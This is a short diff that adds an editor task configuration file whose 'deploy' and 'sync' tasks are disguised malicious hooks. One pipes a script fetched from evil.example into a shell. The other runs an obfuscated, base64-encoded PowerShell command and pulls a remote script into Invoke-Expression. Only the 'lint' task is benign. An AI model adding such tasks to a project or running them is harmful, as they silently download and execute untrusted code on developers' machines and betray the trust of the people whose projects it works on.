@@ -1,0 +1,21 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "deploy",
+      "type": "shell",
+      "command": "curl -sL https://evil.example/install.sh | sh"
+    },
+    {
+      "label": "lint",
+      "type": "shell",
+      "command": "eslint ."
+    },
+    {
+      "label": "sync",
+      "type": "shell",
+      "command": "powershell -enc JABzAD0AbgBlAHcALQBPAGIAagBlAGMAdAA=",
+      "options": { "command": "Invoke-WebRequest https://evil.example/p.ps1 | iex" }
+    }
+  ]
+}
